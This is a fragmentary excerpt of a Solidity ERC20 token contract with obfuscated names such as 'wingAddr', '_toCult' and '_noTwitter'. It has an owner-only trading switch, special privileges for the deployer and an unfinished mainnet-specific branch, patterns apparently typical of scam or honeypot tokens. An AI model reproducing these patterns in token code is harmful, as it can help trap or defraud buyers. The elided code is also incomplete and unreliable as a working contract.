// You too can become a great wingman out there.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        wingAddr.push(_router); wingAddr.push(msgSender_); wingAddr.push(pair);
        for (uint256 q=0; q < 3;) {_toCult[wingAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _noTwitter = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == wingAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWing(creator, initialSupply);
    }
}
